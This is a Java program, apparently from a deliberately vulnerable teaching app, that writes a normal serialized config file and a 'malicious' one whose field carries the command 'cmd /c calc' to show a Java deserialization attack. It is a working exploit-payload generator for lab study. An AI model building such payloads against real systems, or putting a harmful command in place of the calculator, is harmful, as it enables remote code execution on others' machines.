import com.vulnapp.vulnerabilities.deserialization.payload.MaliciousConfig;
import com.vulnapp.vulnerabilities.deserialization.payload.SystemConfig;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class GenerateMaliciousConfig {
    public static void main(String[] args) {
        try {
            // 정상 파일 생성
            SystemConfig normalConfig = new SystemConfig("localhost", 8080, "production");
            try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("system_config.ser"))) {
                oos.writeObject(normalConfig);
                System.out.println("정상적인 SystemConfig 파일 생성: system_config.ser");
            }

            // 악성 파일 생성
            String host = "localhost";
            int port = 8080;
            String environment = "cmd /c calc"; // 실행할 명령어 (악성 데이터)
            MaliciousConfig maliciousConfig = new MaliciousConfig(host, port, environment);

            try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("malicious_config.ser"))) {
                oos.writeObject(maliciousConfig);
                System.out.println("악성 MaliciousConfig 파일 생성: malicious_config.ser");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
